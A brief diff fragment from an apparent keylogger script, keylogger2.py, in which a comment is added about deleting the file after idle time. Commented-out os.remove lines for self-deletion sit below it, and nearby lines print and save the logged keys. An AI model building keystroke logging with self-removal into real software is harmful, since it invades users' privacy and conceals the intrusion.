@@ -28,6 +28,7 @@ def check_inactivity():
         if time.time() > timeout_start + TIMEOUT:
             print(input_keys)
             write_logged_keys()
+            # code that could delete this file after some amount of idle time.
             # cur_dir = os.getcwd()
             # os.remove(cur_dir + "/keylogger2.py")
 
